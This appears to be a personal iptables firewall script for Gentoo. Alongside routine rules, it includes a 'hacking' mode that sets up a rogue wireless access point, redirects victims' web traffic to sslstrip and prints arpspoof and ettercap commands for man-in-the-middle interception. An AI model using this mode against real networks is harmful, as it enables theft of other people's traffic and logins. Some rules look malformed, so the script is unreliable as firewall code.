#!/bin/sh
# This script is by and for Cyb3r-Assassin too accommodate my work.
# You are free to modify and distribute as you please
# The syntax is for Gentoo Linux and may need adjusted for different distributions
# Twitter @Cyb3r_Assassin Freenode Cyb3r-Assassin

# WARNING there is NO error checking in this script.
# This script is not deisgned for out of box production level use
# I will assume you know wtf you are doing, if not sucks to be you

IPT="/sbin/iptables"
RESERVD="10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 127.0.0.0/8 169.254.0.0/16"
DHCP="-t nat"
LAN="eth0"
LAN2="eth1"
WAN="-t nat"
WLAN="wlan0"
AP="at0"
VPN="tun0"
VPNI="tap+"
OK=`printf "\e[1;32m OK \e[0m"`
WARN=`printf "\e[1;33m WARNING \e[0m"`
CRIT=`printf "\e[1;31m WARNING \e[0m"`
if [ $(whoami) != 'root'  ]; then 
	echo "[$CRIT] Please Run This Script As Root or With Sudo!"
	exit 0
fi

fw_redundant()
{
	## Flush rules
	echo "[$WARN] Flushing old rules"
	/etc/init.d/iptables stop
	$IPT -F
	$IPT --delete-chain
	$IPT $WAN -F
	$IPT $WAN --delete-chain
	$IPT -t filter --flush FORWARD
	$IPT -t filter --flush INPUT

	# Set default policies for all three default chains
	echo "[$OK] Setting default policies"
	$IPT -P OUTPUT ACCEPT

	echo "[$OK] We will allow ip forwarding"
	echo 1 > /proc/sys/net/ipv4/ip_forward
	$IPT -P FORWARD ACCEPT
	$IPT -F FORWARD

	# Enable free use of loopback interfaces
	echo "[$OK] Allowing loopback devices"
	$IPT -A INPUT -i lo -j ACCEPT
	$IPT -A OUTPUT -o lo -j ACCEPT

	## permit local network
	echo "[$OK] Permit local network"
	$IPT -A INPUT -i $LAN -j ACCEPT
	$IPT -A OUTPUT -o $LAN -j ACCEPT

	## DHCP
	echo "[$OK] Allowing DHCP server"
	$IPT -A INPUT $WAN -p udp --sport 67 --dport 68 -j ACCEPT

	## Allow Samba
	echo "[$OK] Configuring Samba"
	$IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	$IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	$IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	$IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT

	read -p "Would you like to enable the configured server services such as ssh httpd? (y/n) " RESP
	if [ "$RESP" == "y" ]; then fw_services; fi # Future add error checking

	read -p "[$OK] Would you like to turn on OpenVPN now? (y/n) " RESP
	if [ "$RESP" == "y" ]; then fw_vpn; fi # Future add error checking
}

fw_services()
{
	## Allow DNS Server
	echo "[$OK] Allowing dns on port 53"
	$IPT -A INPUT $WAN -p udp -m udp --dport 53 -j ACCEPT

	## SSH (allows SSH to firewall, from anywhere on the WAN)
	echo "[$OK] Allowing ssh on port 22"
	$IPT -A INPUT $WAN -p tcp --dport 22 -j ACCEPT

	## Web server
	echo "[$OK] Allowing http on port 80 and https on 443"
	$IPT -A INPUT $WAN -p tcp -m multiport --dports 80,443 -j ACCEPT
	return 0
}

vpn_confirmed()
{
	#Allow TUN interface connections to OpenVPN server
	echo "[$OK] Allowing openVPN"
	$IPT -A INPUT -i $VPN -j ACCEPT
	#allow TUN interface connections to be forwarded through other interfaces
	$IPT -A FORWARD -i $VPN -j ACCEPT
	# Allow TAP interface connections to OpenVPN server
	$IPT -A INPUT -i $VPNI -j ACCEPT
	# Allow TAP interface connections to be forwarded through other interfaces
	$IPT -A FORWARD -i $VPNI -j ACCEPT
	# I've been called into action
	/etc/init.d/openvpn start
}

fw_vpn()
{
	echo "[$WARN] Please pay close attention to the following when considering turning on openvpn."
	echo "[$WARN] The gateway is still broken for dual nics wile hosting services." # Do some work on custom gateway routing for this soon 10-22-2013"
	echo "[$WARN] Be careful the VPN configuration could break your gateway for MiTM attacks and remote services."
	echo "[$OK] This will be fixed in the future."
	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time 10-29-2013"
	read -p "[$OK] Do you still want to turn on OpenVPN now? (y/n) " RESP
	if [ "$RESP" = "y" ]; then vpn_confirmed; fi # Future add error checking
}

fw_closure()
{
	## drop everything else arriving from WAN on local interfaces
	echo -e "\n[$OK] Drop everything else"
	$IPT -A INPUT -i $LAN -j LOG
	$IPT -A INPUT -i $LAN -j DROP
	$IPT -A INPUT -i $LAN2 -j LOG
	$IPT -A INPUT -i $LAN2 -j DROP
	#
	# Save settings
	#
	echo "[$OK] Saving settings"
	/etc/init.d/iptables save
	/etc/init.d/iptables start

	## list the iptable rules as confirmation
	echo "[$OK] Listing the iptables rules as confirmation"
	$IPT -L -v
}

hacking()
{
	read -p "[$OK] Are we using airbase? (y/n) " RESP
	if [ "$RESP" == "y" ]; then
		echo -e "[$OK] Allowing wirless for airbase, routing $AP through $LAN\nbe sure airbase was configured for $AP and $LAN as the output\notherwise adjust these settings"
		$IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
		$IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
	else read -p "[$OK] Are we using hostapd? (y/n) " RESP then
		if [ "$RESP" == "y" ]; then
		echo -e "[$OK] Allowing wireless for hostapd, routing $WLAN through $LAN\nbe sure hostapd was configured for $WLAN and $LAN as the output\notherwise adjust these settings"
		$IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
		$IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
		fi
	fi
	
	read -p "[$OK] Are we using sslstrip? (y/n) " RESP
	if [ "$RESP" == "y" ]; then
		echo "[$OK] Forwarding nat traffic to sslstrip server on p10000"
		$IPT $WAN -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
		$IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
		$IPT $WAN -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:10000
		$IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
		echo -e "\n[$WARN] Here are some reminders, first setup spoofing. This will be automagic in the future"
		echo -e "\n[$OK] arpspoof -i wlan0/eth0 192.168.1.10 192.168.1.1 \n where 192.168.1.10 is the victim and 192.168.1.1 is the gateway ip address."
		echo -e "\nThis means on this interface intercept traffic from *.10 that is using gateway *.1 \n * now run sslstrip"
		echo -e "\n[$OK] python /usr/lib64/sslstrip/sslstrip.py -k -f lock.ico \n * load sslstrip and use the provided lock.ico icon as a replacement if need be."
		echo -e "\nIf you setup ettercap for MiTM arp spoofing you don't need arpspoof. You must manually edit the ettercap config for this.\n Or just run ettercap and let it sniff arpspoof+sslstrips work"
	fi
}

fw_up()
{ 
	fw_redundant
	echo -e "[$OK] It's time for specialty hacking configurations"
	echo -e "These settings are not default as they may break daily activity."
	read -p "[$OK] Are we doing any hacking? (y/n) " RESP
	if [ "$RESP" == "y" ]; then
		$IPT $WAN -A POSTROUTING -o $LAN -j MASQUERADE
		hacking
	fi
	fw_closure
}

fw_down()
{ 
	fw_redundant
	echo "[$WARN] You are no longer bridged! If you need bridging still you will need to add that rule yourself."
	echo "[$OK] Defaults loaded for daily use."
	fw_closure
}

read -p "[$OK] Are we going up or down? (Up/Down) " RESP
if [ "$RESP" == "Up" ]; then
	fw_up
else
	fw_redundant
	echo "[$WARN] You are no longer bridged! If you need bridging still you will need to add that rule yourself."
	echo "[$OK] Defaults loaded for daily use."
	fw_closure
fi